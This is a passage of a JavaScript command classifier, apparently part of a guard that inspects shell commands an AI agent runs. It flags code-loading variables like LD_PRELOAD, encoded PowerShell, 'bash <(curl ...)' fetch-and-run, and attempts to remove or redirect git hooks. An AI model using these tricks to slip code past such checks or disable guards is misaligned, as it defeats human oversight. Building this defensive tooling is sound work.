/** "NAME+=x", "NAME[k]=x" -> "NAME". */
function variableName(assignment) {
  return assignment.slice(0, assignment.indexOf('=')).replace(/\+$/, '').replace(/\[.*$/, '');
}

/** A shell variable this command sets for the commands after it ("m=--hard; git reset $m"). */
function noteShellValue(out, name, value, dynamic) {
  if (!out.shellValues) out.shellValues = new Map();
  out.shellValues.set(name, { value: String(value ?? ''), dynamic: Boolean(dynamic) });
}

/** A variable set for a command (or exported): some hold a command, some point git at hidden settings. */
/**
 * A variable set for a program (a prefix "NAME=value cmd", env, export, declare -x, fish set -x,
 * PowerShell $env: and Set-Item env:). Only common harmless settings pass (BENIGN_ENV_VARS); any
 * other variable makes the command unknown, because many change what a program loads or runs
 * (LD_PRELOAD, DYLD_*, NODE_OPTIONS, JAVA_TOOL_OPTIONS, PYTHONSTARTUP, BASH_ENV, GIT_*, CARGO_*,
 * npm_config_*, GCONV_PATH, MAKEFLAGS, CC ...) and no list of those is ever complete.
 * Some pass on conditions: PATH with only system folders and the project's node_modules/.bin;
 * module paths (NODE_PATH, PYTHONPATH ...) inside the project; RUSTFLAGS without a linker;
 * GOFLAGS without -toolexec/-exec. Pagers and editors (PAGER=cat) hold a command, which is read.
 *
 * A plain shell variable (not exported, no program after it) matters only if programs read it
 * and it is already exported, so only names programs are known to read count then.
 */
function variableSet(name, value, isDynamic, ctx, out, depth, { exported = true } = {}) {
  const v = String(value ?? '');
  // git takes settings from GIT_CONFIG_KEY_<n> and GIT_CONFIG_PARAMETERS as it does from -c: one
  // that names core.hooksPath, or is named only when the command runs, may change where git takes
  // its guards from (ADR-0111 review). The variable is still unknown below.
  if (/^GIT_CONFIG_(KEY_\d+|PARAMETERS)$/.test(name) && (isDynamic || namesHooksPath(v))) {
    nameIncidentStep(out, INCIDENT_RESOURCES.removeGuard, `changes where git takes its guards from (${name})`);
  }
  if (COMMAND_ENV_VARS.has(name)) {
    // The value is a command another program runs: read it as one.
    classifyCommandText(v, isDynamic, ctx, out, depth);
    if (!PAGER_EDITOR_VARS.has(name)) unknownProgram(out, `sets ${name}, a command another program runs`);
    return;
  }
  if (name === 'PATH') {
    // After it, a known program name may be any program, unless only system folders and the
    // project's node_modules/.bin are added.
    if (!pathEntriesTrusted(v, ctx)) unknownProgram(out, 'sets PATH to folders where a known name may be another program');
    return;
  }
  if (MODULE_PATH_ENV_VARS.has(name)) {
    if (isDynamic || v.split(/[:;]/).some((e) => e && !insideProject(e, false, ctx))) unknownProgram(out, `sets ${name} to load code from outside the project`);
    return;
  }
  if (name === 'RUSTFLAGS' || name === 'CARGO_ENCODED_RUSTFLAGS') {
    if (isDynamic || /linker|link-arg|-Z|plugin/i.test(v)) unknownProgram(out, `sets ${name} to run another linker`);
    return;
  }
  if (name === 'GOFLAGS') {
    if (isDynamic || /-(toolexec|exec|overlay|modfile)\b/.test(v)) unknownProgram(out, 'sets GOFLAGS to run another program around go');
    return;
  }
  if (exported) {
    if (!isBenignVariable(name)) unknownProgram(out, `sets ${name} for a program; only common harmless settings are known`);
    return;
  }
  // A plain shell variable reaches programs when it is already exported, which Aimiru cannot see.
  // Environment variables are upper case by convention, so those get the same allowlist; lower
  // case names are the shell's own, except the few programs read (npm_config_*, *_proxy).
  if (/^[A-Z_][A-Z0-9_]*$/.test(name) ? !isBenignVariable(name) : /^(npm_config_\w+|\w*_proxy)$/i.test(name)) {
    unknownProgram(out, `sets ${name}, which programs may read`);
  }
}

/** Settings commonly set for a single command that change nothing a program loads or runs. */
const BENIGN_ENV_VARS = new Set([
  'CI', 'NODE_ENV', 'BABEL_ENV', 'RAILS_ENV', 'RACK_ENV', 'APP_ENV', 'MIX_ENV', 'FLASK_ENV', 'FLASK_DEBUG', 'RUST_LOG',
  'RUST_BACKTRACE', 'RUST_LIB_BACKTRACE', 'DEBUG', 'VERBOSE', 'LOG_LEVEL', 'LOGLEVEL', 'TERM', 'COLORTERM', 'LANG', 'LANGUAGE',
  'TZ', 'NO_COLOR', 'FORCE_COLOR', 'CLICOLOR', 'CLICOLOR_FORCE', 'COLUMNS', 'LINES', 'PORT', 'HOST', 'PYTHONUNBUFFERED',
  'PYTHONDONTWRITEBYTECODE', 'PYTHONIOENCODING', 'PYTHONHASHSEED', 'PYTHONFAULTHANDLER', 'PYTHONUTF8', 'NODE_NO_WARNINGS',
  'GOOS', 'GOARCH', 'CGO_ENABLED', 'GOMAXPROCS', 'CARGO_TERM_COLOR', 'CARGO_INCREMENTAL', 'HUSKY', 'NEXT_TELEMETRY_DISABLED',
  'TURBO_TELEMETRY_DISABLED', 'DO_NOT_TRACK', 'BROWSERSLIST_IGNORE_OLD_DATA', 'UPDATE_SNAPSHOTS',
]);
/** Families of harmless settings: locale, public build-time values, and a project's own test flags. */
const BENIGN_ENV_FAMILIES = /^(LC_[A-Z]+|VITE_\w+|NEXT_PUBLIC_\w+|REACT_APP_\w+|EXPO_PUBLIC_\w+|NUXT_PUBLIC_\w+|PUBLIC_\w+|(TEST|TESTS|E2E|SKIP|RUN|ENABLE|DISABLE|FEATURE|MOCK|FAKE|SEED)_[A-Z0-9_]+)$/;

function isBenignVariable(name) {
  return BENIGN_ENV_VARS.has(name) || BENIGN_ENV_FAMILIES.test(name);
}

/** Names programs are known to read: documentation of why the allowlist exists (and a list Aimiru for Hermes shares). */
const PROGRAMS_READ_THESE = /^(LD_\w+|DYLD_\w+|GCONV_PATH|NODE_\w+|PYTHON\w+|PERL\w*|RUBY\w+|GEM_\w+|BUNDLE_\w+|JAVA\w*|_JAVA_OPTIONS|JDK_JAVA_OPTIONS|MAVEN_OPTS|GRADLE_OPTS|DOTNET_\w+|CARGO_\w+|RUSTC\w*|RUSTDOC\w*|GO\w+|CC|CXX|CPP|LD|AR|BASH_ENV|ENV|ZDOTDIR|PROMPT_COMMAND|IFS|CDPATH|SHELL|SHELLOPTS|BASHOPTS|MAKE\w*|MFLAGS|BUN_\w+|DENO_\w+|NPM_CONFIG_\w+|npm_config_\w+|YARN_\w+|PNPM_\w+|SSH_ASKPASS|SUDO_ASKPASS|HOME|XDG_\w+|TMPDIR|SAYSO_\w+|AIMIRU_\w+|CLAUDE_\w+)$/;

/** Variables whose value is a command another program runs; for pagers and editors it is all they do. */
const PAGER_EDITOR_VARS = new Set(['PAGER', 'GIT_PAGER', 'MANPAGER', 'SYSTEMD_PAGER', 'BAT_PAGER', 'DELTA_PAGER', 'EDITOR', 'VISUAL', 'GIT_EDITOR', 'GIT_SEQUENCE_EDITOR']);
/** Module search paths and tool homes whose settings load code: allowed only inside the project. */
const MODULE_PATH_ENV_VARS = new Set(['NODE_PATH', 'PERL5LIB', 'PERLLIB', 'RUBYLIB', 'PYTHONPATH']);
/** Folders a PATH may add without making program names untrustworthy. */
const TRUSTED_PATH_DIRS = [...SYSTEM_BIN_DIRS, '/usr/local/sbin', '/opt/homebrew/sbin', '/opt/local/sbin'];

/** True when every PATH entry is the old PATH, a system folder, or the project's node_modules/.bin. */
function pathEntriesTrusted(value, ctx) {
  return String(value).split(/[:;]/).every((entry) => {
    const e = entry.trim();
    if (/^(\$PATH|\$\{PATH\}|\$env:PATH)$/i.test(e)) return true;
    if (e === '') return false; // an empty entry is the current folder
    const p = resolvePathWord(e, ctx);
    if (!p) return false;
    if (TRUSTED_PATH_DIRS.includes(p)) return true;
    return /(^|[\\/])node_modules[\\/]\.bin$/.test(p) && insideProject(e, false, ctx);
  });
}

/** A program Aimiru cannot name before it runs: at least "other", and never let through when Aimiru is down. */
function unknownProgram(out, why) {
  out.classes.push('other');
  out.sensitive = true;
  out.unknownProgram = true;
  out.why.push(why);
}

/** Classifies text another program runs as commands (eval, sh -c, a here-document fed to a shell). */
function classifyCommandText(text, isDynamic, ctx, out, depth, why = 'runs a command built when it runs') {
  if (isDynamic) unknownProgram(out, why);
  classifyInto(String(text ?? ''), ctx, out, depth + 1);
}

function withDialect(ctx, powershell) {
  return Boolean(ctx.powershell) === powershell ? ctx : { ...ctx, powershell };
}

/** Text a program reads as its input when the command line shows it: a here-document or a here-string. */
function stdinText(seg) {
  for (const r of seg.redirects || []) {
    // A bare delimiter lets the shell substitute $VAR and $(...) into the body before it is read.
    if (r.op === '<<' || r.op === '<<-') return { text: r.body || '', dynamic: !r.quoted && /[$`]/.test(r.body || '') };
    if (r.op === '<<<') return { text: r.target, dynamic: Boolean(r.dynamic) };
  }
  return null;
}

/** The program's input is another program's output: a pipe, or "< <(cmd)". */
function inputFromProgram(seg) {
  return Boolean(seg.piped) || (seg.redirects || []).some((r) => r.op === '<' && isProgramOutputPath(r.target));
}

/** The program's input is not a person at a terminal: a pipe, or a file or another program after "<". */
function inputRedirected(seg) {
  return inputFromProgram(seg) || (seg.redirects || []).some((r) => r.op === '<' || r.op === '<&' || r.op === '<>');
}

/** Redirections that give a command its input; with more than one, which wins is not read. */
const INPUT_REDIRECTS = new Set(['<', '<&', '<>', '<<', '<<-', '<<<']);

/** Script operands that are the program's own input: "bash -", "python3 /dev/stdin". */
const STDIN_OPERANDS = new Set(['-', '/dev/stdin', '/dev/fd/0', '/proc/self/fd/0']);
/** Another program's output as a file: "bash <(curl ...)" runs as "bash /dev/fd/63". */
function isProgramOutputPath(a) {
  return /^\/dev\/fd\/\d+$|^\/proc\/(self|\d+)\/fd\/\d+$/.test(a) && !STDIN_OPERANDS.has(a);
}

/** Where a script operand says the program comes from: its input, another program, or a file. */
function scriptSource(operand) {
  if (operand === undefined || STDIN_OPERANDS.has(operand)) return { stdin: true };
  if (isProgramOutputPath(operand)) return { fd: true };
  return { script: true };
}

/** How a POSIX shell (or fish) gets its commands: -c text, a script file, its input, or another program. */
function posixShellInvocation(args, argDyn) {
  let sawC = false;
  let sawS = false;
  let k = 0;
  for (; k < args.length; k += 1) {
    const a = args[k];
    if (a === '--') {
      k += 1;
      break;
    }
    if (a === '-') break; // an operand: the program is read from input
    if (/^--(rcfile|init-file)$/.test(a)) {
      k += 1;
      continue;
    }
    if (a === '--command') {
      sawC = true;
      continue;
    }
    if (a.startsWith('--command=')) return { text: a.slice('--command='.length), dynamic: argDyn[k] };
    if (a.startsWith('--')) continue;
    if (/^[-+][A-Za-z]+$/.test(a)) {
      if (a[0] === '-' && a.includes('c')) sawC = true;
      if (a[0] === '-' && a.includes('s')) sawS = true; // -s: commands come from input
      if (/[oO]/.test(a.slice(1))) k += 1; // -o pipefail, +O extglob
      continue;
    }
    break;
  }
  if (sawC) return k < args.length ? { text: args[k], dynamic: argDyn[k] } : { none: true };
  if (sawS) return { stdin: true };
  return { ...scriptSource(args[k]), operand: args[k], operandDynamic: Boolean(argDyn[k]) };
}

const PS_VALUE_PARAMS = ['executionpolicy', 'windowstyle', 'outputformat', 'inputformat', 'configurationname', 'workingdirectory', 'version', 'psconsolefile', 'settingsfile', 'custompipename', 'encodedarguments'];
const PS_VALUE_ALIASES = ['ep', 'ex', 'w', 'o', 'of', 'if', 'wd', 'v', 'ea'];

/** -EncodedCommand is base64 of UTF-16LE text. Text that does not decode cleanly is unknown. */
function decodePowerShellEncoded(value) {
  // PowerShell decodes strictly (whitespace aside); Node skips bad characters, so check first.
  const b64 = String(value).replace(/\s+/g, '');
  if (!b64 || b64.length % 4 !== 0 || !/^[A-Za-z0-9+/]+={0,2}$/.test(b64)) return null;
  try {
    const text = Buffer.from(b64, 'base64').toString('utf16le');
    if (!text || /[\u0000-\u0008\u000e-\u001f�]/.test(text)) return null;
    return text;
  } catch {
    return null;
  }
}

/** How PowerShell gets its commands: -Command, -EncodedCommand, -File, its input, or the rest of the words. */
function powershellInvocation(args, argDyn) {
  for (let k = 0; k < args.length; k += 1) {
    const a = args[k];
    if (!a.startsWith('-')) return { text: args.slice(k).join(' '), dynamic: argDyn.slice(k).some(Boolean) };
    const p = a.slice(1).toLowerCase();
    if (p === 'c' || (p.length >= 3 && 'command'.startsWith(p))) {
      const rest = args.slice(k + 1);
      if (rest.length === 1 && rest[0] === '-') return { stdin: true };
      return { text: rest.join(' '), dynamic: argDyn.slice(k + 1).some(Boolean) };
    }
    if (p === 'e' || p === 'ec' || (p.length >= 2 && 'encodedcommand'.startsWith(p))) {
      if (k + 1 >= args.length) return { none: true };
      const decoded = argDyn[k + 1] ? null : decodePowerShellEncoded(args[k + 1]);
      return decoded == null ? { text: '', dynamic: true } : { text: decoded, dynamic: false };
    }
    if (p === 'f' || (p.length >= 2 && 'file'.startsWith(p))) return { ...scriptSource(args[k + 1]), operand: args[k + 1], operandDynamic: Boolean(argDyn[k + 1]) };
    if (PS_VALUE_ALIASES.includes(p) || (p.length >= 3 && PS_VALUE_PARAMS.some((n) => n.startsWith(p)))) k += 1;
  }
  return { stdin: true };
}

/** cmd /c "...": carets escape, %VAR% is substituted before the line is read. */
function cmdInvocation(args, argDyn) {
  for (let k = 0; k < args.length; k += 1) {
    const m = /^\/\/?([ck])(.*)$/is.exec(args[k]);
    if (m) {
      const raw = [m[2], ...args.slice(k + 1)].filter((s) => s !== '').join(' ');
      const text = raw.replace(/\^(.)/g, '$1');
      return { text: text.replace(/%[^%\s]+%/g, '$CMDVAR'), dynamic: argDyn.slice(k).some(Boolean) || /%[^%\s]+%/.test(text) };
    }
    if (!/^\/\/?/.test(args[k])) break;
  }
  return { stdin: true };
}

// git's own options before the subcommand, and the ones that take the next word.
const GIT_VALUE_OPTS = new Set(['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--super-prefix', '--config-env', '--attr-source']);
// git's own switches before the step (git does not take abbreviations here).
const GIT_GLOBAL_SWITCHES = /^(-v|--version|-h|--help|-p|--paginate|-P|--no-pager|--bare|--no-replace-objects|--no-lazy-fetch|--no-optional-locks|--no-advice|--literal-pathspecs|--glob-pathspecs|--noglob-pathspecs|--icase-pathspecs|--html-path|--man-path|--info-path|--exec-path|--list-cmds=.*|--exec-path=.*|--config-env=.*|--git-dir=.*|--work-tree=.*|--namespace=.*|--super-prefix=.*|--attr-source=.*)$/;
// git settings that send its traffic through another computer or to another address: a proxy
// (http.proxy, https.proxy, http.<url>.proxy, remote.<name>.proxy) or a push address rewrite.
const GIT_ROUTE_SETTINGS = /^((https?(\.[^=]+)?|remote\.[^=]+)\.proxy|url\.[^=]+\.pushinsteadof)$/i;
// git settings whose value is a command git runs.
const GIT_COMMAND_SETTINGS =/^(core\.(sshcommand|pager|editor|fsmonitor|askpass|gitproxy|alternaterefscommand)|diff\.external|diff\.[^=]+\.(textconv|command)|difftool\.[^=]+\.(cmd|path)|mergetool\.[^=]+\.(cmd|path)|filter\.[^=]+\.(clean|smudge|process)|gpg(\.[^=]+)?\.program|sequence\.editor|pager\.[^=]+|uploadpack\.packobjectshook|merge\.[^=]+\.driver|interactive\.difffilter|ssh\.variant|remote\.[^=]+\.(uploadpack|receivepack|vcs)|credential(\.[^=]+)?\.helper|sendemail\.(smtpserver|tocmd|cccmd)|(browser|man)\.[^=]+\.(cmd|path)|web\.browser|protocol\.[^=]+\.allow|url\.[^=]+\.insteadof)$/i;

// git's own steps (git --list-cmds=builtins,main, 2.54). Any other name is an alias from a
// config file or a git-<name> program found on PATH: Aimiru cannot see what it does.
const GIT_STEPS = new Set(`add am annotate apply archimport archive backfill bisect blame branch bugreport bundle cat-file
check-attr check-ignore check-mailmap check-ref-format checkout checkout--worker checkout-index cherry cherry-pick citool
clean clone column commit commit-graph commit-tree config count-objects credential credential-cache
credential-cache--daemon credential-netrc credential-osxkeychain credential-store cvsexportcommit cvsimport cvsserver
daemon describe diagnose diff diff-files diff-index diff-pairs diff-tree difftool difftool--helper fast-export
fast-import fetch fetch-pack filter-branch fmt-merge-msg for-each-ref for-each-repo format-patch fsck fsck-objects
fsmonitor--daemon gc get-tar-commit-id grep gui hash-object help history hook http-backend http-fetch http-push
imap-send index-pack init init-db instaweb interpret-trailers jump last-modified log ls-files ls-remote ls-tree
mailinfo mailsplit maintenance merge merge-base merge-file merge-index merge-octopus merge-one-file merge-ours
merge-recursive merge-recursive-ours merge-recursive-theirs merge-resolve merge-subtree merge-tree mergetool mktag
mktree multi-pack-index mv name-rev notes p4 pack-objects pack-redundant pack-refs patch-id pickaxe prune prune-packed
pull push quiltimport range-diff read-tree rebase receive-pack reflog refs remote remote-ext remote-fd remote-ftp
remote-ftps remote-http remote-https repack replace replay repo request-pull rerere reset restore rev-list rev-parse
revert rm send-email send-pack sh-i18n--envsubst shell shortlog show show-branch show-index show-ref sparse-checkout
stage stash status stripspace submodule submodule--helper subtree svn switch symbolic-ref tag unpack-file
unpack-objects update-index update-ref update-server-info upload-archive upload-archive--writer upload-pack var
verify-commit verify-pack verify-tag version web--browse whatchanged worktree write-tree`.split(/\s+/));

// git steps that only read or change this repository on this computer.
const GIT_LOCAL_STEPS = new Set(`add am annotate apply archive bisect blame branch bundle cat-file check-attr check-ignore
check-mailmap check-ref-format checkout checkout-index cherry cherry-pick clean column commit commit-graph commit-tree
count-objects describe diagnose diff diff-files diff-index diff-pairs diff-tree difftool fast-export fast-import
fmt-merge-msg for-each-ref format-patch fsck fsck-objects gc grep hash-object help history hook index-pack init init-db
interpret-trailers jump last-modified log ls-files ls-tree mailinfo mailsplit merge merge-base merge-file merge-index
merge-octopus merge-one-file merge-ours merge-recursive merge-recursive-ours merge-recursive-theirs merge-resolve
merge-subtree merge-tree mergetool mktag mktree multi-pack-index mv name-rev notes pack-objects pack-redundant pack-refs
patch-id pickaxe prune prune-packed range-diff read-tree rebase reflog refs repack replace replay repo rerere reset
restore rev-list rev-parse revert rm shortlog show show-branch show-index show-ref sparse-checkout stage stash status
stripspace switch symbolic-ref tag unpack-file unpack-objects update-index update-ref update-server-info var
verify-commit verify-pack verify-tag version whatchanged worktree write-tree`.split(/\s+/));

/**
 * Variables that make git read settings (aliases, commands it runs) from somewhere this command
 * line does not show, or run its steps from another folder.
 */
const GIT_SETTINGS_VARIABLES = /^(HOME|XDG_CONFIG_HOME|GIT_DIR|GIT_COMMON_DIR|GIT_TEMPLATE_DIR|GIT_CONFIG|GIT_CONFIG_NOSYSTEM|GIT_CONFIG_COUNT|GIT_CONFIG_PARAMETERS|GIT_CONFIG_GLOBAL|GIT_CONFIG_SYSTEM|GIT_EXEC_PATH|GIT_CONFIG_KEY_\w+|GIT_CONFIG_VALUE_\w+)$/;
function isGitSettingsVariable(name) {
  return GIT_SETTINGS_VARIABLES.test(name);
}

/** git's subcommand after its own options, with what `-c name=value` settings say. */
function gitInvocation(args, argDyn, ctx) {
  const aliases = new Map();
  const commands = [];
  let hooks = false;
  // Settings Aimiru cannot read: --config-env (the value is in a variable), -c include.path and
  // includeIf (another file), --exec-path=<dir> (steps from another folder), -c "$X".
  let hidden = false;
  let k = 0;
  while (k < args.length && args[k].startsWith('-')) {
    const a = args[k];
    if (/^--(config-env|exec-path)=/.test(a)) hidden = true;
    // --config-env=core.hooksPath=VAR sets the guards' folder from a variable (ADR-0111 review).
    const configEnv = /^--config-env=([^=]*)=/.exec(a);
    if (configEnv && (configEnv[1].toLowerCase() === 'core.hookspath' || argDyn[k])) hooks = true;
    if (!GIT_VALUE_OPTS.has(a) && !GIT_GLOBAL_SWITCHES.test(a)) hidden = true; // an option Aimiru does not know
    // Another repository (git -C, --git-dir, --work-tree outside the project) brings its own settings.
    const repo = /^--(git-dir|work-tree)=(.*)$/s.exec(a);
    if (repo && !insideProject(repo[2], argDyn[k], ctx)) hidden = true;
    if (GIT_VALUE_OPTS.has(a)) {
      const v = args[k + 1] ?? '';
      if (a === '--config-env') {
        hidden = true;
        if (argDyn[k + 1] || v.split('=')[0].toLowerCase() === 'core.hookspath') hooks = true;
      }
      if (['-C', '--git-dir', '--work-tree'].includes(a) && !insideProject(v, argDyn[k + 1], ctx)) hidden = true;
      if (a === '-c') {
        const eq = v.indexOf('=');
        const key = (eq === -1 ? v : v.slice(0, eq)).toLowerCase();
        const value = eq === -1 ? '' : v.slice(eq + 1);
        if (argDyn[k + 1] && (eq === -1 || /[$`]/.test(v.slice(0, eq)))) {
          // A setting named only when the command runs may be core.hooksPath.
          hidden = true;
          hooks = true;
        }
        if (key.startsWith('include.') || key.startsWith('includeif.')) hidden = true;
        else if (key.startsWith('alias.')) aliases.set(key.slice('alias.'.length), { value, dynamic: argDyn[k + 1] });
        else if (GIT_COMMAND_SETTINGS.test(key)) commands.push({ text: value.replace(/^!/, ''), dynamic: argDyn[k + 1] });
        else if (key === 'core.hookspath') hooks = true;
      }
      k += 2;
      continue;
    }
    k += 1;
  }
  return { sub: (args[k] ?? '').toLowerCase(), index: k, subDynamic: Boolean(argDyn[k]), aliases, commands, hooks, hidden };
}

// ---------------------------------------------------------------------------
// The founder's incident steps (ADR-0111): whole-tree discards and git guards.
// ---------------------------------------------------------------------------

/**
 * A glob pattern (* ? [...] and backslash escapes) as single steps: {star}, {any}, {set, negate}
 * or {ch}. A bracket with no closing "]" is a plain "[".
 */
function globSteps(pattern) {
  const steps = [];
  const p = String(pattern);
  for (let i = 0; i < p.length; i += 1) {
    const ch = p[i];
    if (ch === '\\' && i + 1 < p.length) {
      i += 1;
      steps.push({ ch: p[i] });
    } else if (ch === '*') {
      if (steps[steps.length - 1]?.star) continue; // "**" in one segment is "*"
      steps.push({ star: true });
    } else if (ch === '?') steps.push({ any: true });
    else if (ch === '[') {
      let j = i + 1;
      const negate = p[j] === '!' || p[j] === '^';
      if (negate) j += 1;
      if (p[j] === ']') j += 1; // "[]x]": a "]" first is one of the characters
      const end = p.indexOf(']', j);
      if (end === -1) {
        steps.push({ ch: '[' });
        continue;
      }
      const body = p.slice(negate ? i + 2 : i + 1, end);
      const set = [];
      for (let k = 0; k < body.length; k += 1) {
        if (body[k + 1] === '-' && k + 2 < body.length) {
          set.push([body[k], body[k + 2]]);
          k += 2;
        } else set.push([body[k], body[k]]);
      }
      steps.push({ set, negate });
      i = end;
    } else steps.push({ ch });
  }
  return steps;
}

/** Whether one step that takes one character takes this one. */
function globStepTakes(step, c, ignoreCase) {
  if (step.any) return true;
  const alts = ignoreCase ? [c.toLowerCase(), c.toUpperCase()] : [c];
  if (step.set) return alts.some((a) => step.set.some(([lo, hi]) => a >= lo && a <= hi)) !== step.negate;
  return alts.includes(step.ch) || (ignoreCase && step.ch.toLowerCase() === c.toLowerCase());
}

/**
 * Whether a glob matches the whole text, without running a regular expression the agent wrote
 * (ADR-0111 review: a pattern like "(.*)*q" could hold the check for minutes). The usual
 * two-pointer match with one "*" to fall back to: time grows with the pattern times the text,
 * never faster. "*" matches any characters ("/" too: callers pass one segment, or want find's
 * reading). With `dotRule`, a leading "." in the text must be matched by a "." in the pattern, as
 * the shell's globs do ("*" never matches ".git").
 */
function globMatch(pattern, text, { ignoreCase = false, dotRule = false } = {}) {
  const steps = globSteps(pattern);
  const t = String(text);
  if (dotRule && t.startsWith('.') && !(steps[0] && steps[0].ch === '.')) return false;
  let si = 0;
  let ti = 0;
  let starAt = -1;
  let starText = 0;
  while (ti < t.length) {
    const step = steps[si];
    if (step && !step.star && globStepTakes(step, t[ti], ignoreCase)) {
      si += 1;
      ti += 1;
    } else if (step && step.star) {
      starAt = si;
      starText = ti;
      si += 1;
    } else if (starAt !== -1) {
      si = starAt + 1;
      starText += 1;
      ti = starText;
    } else return false;
  }
  while (si < steps.length && steps[si].star) si += 1;
  return si === steps.length;
}

/**
 * True when this path segment is `name`, or a glob that would match it. Case is ignored: the
 * disks of a Mac and of Windows ignore it, so ".GIT/HOOKS/PRE-COMMIT" is the real hook there
 * (ADR-0111 review). A glob matches a name that starts with "." only with a "." of its own.
 */
function segmentIs(seg, name) {
  const s = String(seg);
  if (s.toLowerCase() === name.toLowerCase()) return true;
  if (!/[*?[]/.test(s)) return false;
  return globMatch(s, name, { ignoreCase: true, dotRule: true });
}

/** The names git runs a hook by (githooks(5), git 2.54). A file of another name there is not a guard. */
const GIT_HOOK_NAMES = Object.freeze(`applypatch-msg pre-applypatch post-applypatch pre-commit pre-merge-commit
prepare-commit-msg commit-msg post-commit pre-rebase post-checkout post-merge pre-push pre-receive update
proc-receive post-receive post-update reference-transaction push-to-checkout pre-auto-gc post-rewrite
sendemail-validate fsmonitor-watchman p4-changelist p4-prepare-changelist p4-post-changelist p4-pre-submit
post-index-change`.split(/\s+/));

/** True for the path segments under a hooks folder that are a guard: the folder, a hook, or a helper folder in it. */
function hooksRestIsGuard(rest) {
  if (rest.length === 0) return true;
  if (rest.length > 1) return true;
  return GIT_HOOK_NAMES.some((name) => segmentIs(rest[0], name));
}

/**
 * A git guard (ADR-0111): a hook under a repository's .git/hooks (a submodule's .git/modules/x/hooks
 * too), a helper folder there, that folder itself, or the whole .git folder, which holds it. Globs
 * count when they could match one (".git/*", ".git/hooks/pre-*", and ".g*", ".??*" or ".[a-z]*"
 * for the .git folder itself). Case is ignored, as a Mac's disk ignores it. A sample or a renamed
 * hook (".git/hooks/pre-commit.sample") and a lock file (".git/index.lock") are not guards.
 */
export function isGitGuardPath(p) {
  if (!p) return false;
  const segs = String(p).split(/[\\/]+/).filter(Boolean);
  for (let i = 0; i < segs.length; i += 1) {
    if (!segmentIs(segs[i], '.git')) continue;
    const rest = segs.slice(i + 1);
    if (rest.length === 0) return true;
    if (segmentIs(rest[0], 'hooks') && hooksRestIsGuard(rest.slice(1))) return true;
    if (segmentIs(rest[0], 'modules')) {
      const h = rest.findIndex((seg, k) => k > 0 && segmentIs(seg, 'hooks'));
      if (h !== -1 && hooksRestIsGuard(rest.slice(h + 1))) return true;
    }
  }
  return false;
}

/** True when a path segment is a hook by git's name for it (a glob that could be one counts). */
function isHookName(seg) {
  return GIT_HOOK_NAMES.some((name) => segmentIs(seg, name));
}

/**
 * Where a command substitution of git points, when it prints a path in the repository: its .git
 * folder ("git rev-parse --git-dir", "--git-common-dir", "--absolute-git-dir"), a path in it
 * ("--git-path hooks"), or the top of the working folder ("--show-toplevel"). Returns
 * {rel: [".git", ...]} or {top: true}, or null for anything else.
 */
function gitPathOf(text) {
  const t = String(text ?? '').trim();
  if (/[;&|<>`$()\n]/.test(t)) return null;
  const m = /^git\s+(?:-C\s+\S+\s+)?rev-parse\s+(.*)$/.exec(t);
  if (!m) return null;
  const words = m[1].split(/\s+/).map((w) => w.replace(/^['"]|['"]$/g, ''));
  for (let k = 0; k < words.length; k += 1) {
    const w = words[k];
    if (w === '--git-dir' || w === '--git-common-dir' || w === '--absolute-git-dir') return { rel: ['.git'] };
    if (w === '--git-path' && words[k + 1]) return { rel: ['.git', ...words[k + 1].split('/').filter(Boolean)] };
    if (w === '--show-toplevel') return { top: true };
  }
  return null;
}

/** Where a guard written relative to a folder Aimiru cannot know is put, so it still reads as one. */
const UNKNOWN_FOLDER = path.join(path.sep, '.aimiru-unknown-folder');

/** A shell word as a path with its glob characters kept (resolvePathWord cuts a glob to its prefix). */
function guardPathWord(word, isDynamic, ctx) {
  if (isDynamic || word == null) return null;
  const w = String(word)
    .replace(/^~(?=$|\/)/, ctx.home)
    .replace(/^\$HOME(?=$|\/)/, ctx.home)
    .replace(/^\$\{HOME\}(?=$|\/)/, ctx.home);
  if (!w || /[$`%]/.test(w)) return null;
  if (ctx.cwdUnknown && !path.isAbsolute(w)) {
    // Where the command runs is unknown, but a guard written relative to it is still one.
    return w.split(/[\\/]+/).some((seg) => segmentIs(seg, '.git')) ? path.join(UNKNOWN_FOLDER, w) : null;
  }
  return path.resolve(ctx.cwd, w);
}

/**
 * A word named partly when the command runs whose fixed end is a guard: "$(git rev-parse
 * --git-dir)/hooks/pre-commit", "$REPO/.git/hooks", "$HOOKS/pre-commit". What follows the last
 * part named when it runs is the hooks folder of a .git folder, or ends in a hook by its name
 * (ADR-0111 review). A word that starts with git's own answer for where the .git folder is
 * ("$(git rev-parse --git-path hooks)") is read as that path. Returns a stand-in path, or null.
 */
function dynamicGuardWord(word, subs = []) {
  // "${HOOKS:-.git/hooks}": the default's slashes are not the word's.
  const w = String(word ?? '').replace(/\$\{[^}]*\}/g, '$X');
  const segs = w.split(/[\\/]+/);
  let last = -1;
  segs.forEach((s, i) => {
    if (/[$`]/.test(s)) last = i;
  });
  if (last === -1) return null;
  const tail = segs.slice(last + 1).filter(Boolean);
  const git = last === 0 && /^(\$\(\.\.\.\)|`\.\.\.`)$/.test(segs[0]) && subs.length === 1 ? gitPathOf(subs[0]) : null;
  if (git?.rel) {
    const p = path.join(UNKNOWN_FOLDER, ...git.rel, ...tail);
    if (isGitGuardPath(p)) return p;
  }
  if (tail.some((seg) => segmentIs(seg, '.git'))) {
    const p = path.join(UNKNOWN_FOLDER, ...tail);
    return isGitGuardPath(p) ? p : null;
  }
  if (tail.length === 2 && segmentIs(tail[0], 'hooks') && isHookName(tail[1])) return path.join(UNKNOWN_FOLDER, '.git', ...tail);
  if (tail.length >= 1 && isHookName(tail[tail.length - 1])) return path.join(UNKNOWN_FOLDER, '.git', 'hooks', tail[tail.length - 1]);
  return null;
}

/** The project's top, when a word is git's own answer for it ("$(git rev-parse --show-toplevel)"). */
function dynamicProjectTop(word, subs, ctx) {
  if (ctx.cwdUnknown || !/^(\$\(\.\.\.\)|`\.\.\.`)\/?$/.test(String(word ?? '')) || subs?.length !== 1) return null;
  return gitPathOf(subs[0])?.top ? ctx.project : null;
}

/** A guard's path as the person reads it: from where the command runs, or as written. */
function guardShown(p, ctx) {
  if (p.startsWith(UNKNOWN_FOLDER + path.sep)) return p.slice(UNKNOWN_FOLDER.length + 1);
  const r = path.relative(ctx.cwd, p);
  return r && !r.startsWith('..') ? r : p;
}

/**
 * At most this many words come out of one brace word: more than any list a person writes. A word
 * that would give more is read as the worst case (BRACE_TOO_BIG), so padding a list never hides a
 * guard past the end of it (second review).
 */
const BRACE_MAX = 256;

/** A brace range ("1..3", "a..e", "1..9..2") as its words, or null. */
function braceRange(inner, max) {
